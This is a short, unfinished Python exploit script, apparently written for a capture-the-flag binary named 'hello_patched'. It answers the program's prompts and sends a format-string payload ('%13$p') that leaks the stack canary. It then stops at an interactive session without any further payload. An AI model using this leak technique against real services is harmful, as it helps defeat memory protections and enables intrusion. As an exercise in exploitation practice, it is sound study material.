#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./hello_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        brva 0x00000000000016E9
        brva 0x00000000000017BF
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw, aslr=False)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    sla(b'name: ', b'al')
    s(b'\n')
    sla(b'(y/n): ', b'y')
    sla(b'name? ', b'al')

    sla(b' us: ', 'al')
    sla(b'input: ', b'hhn|%13$p.')


    canary = int(ru(b'.', drop=True).split(b'|')[1], 16)
    slog('Canary', canary)

    sla(b'(y/n): ', b'y')

    offset = 0x100

    # sla(b'(y/n): ', b'n')

    interactive()

if __name__ == '__main__':
  exploit()
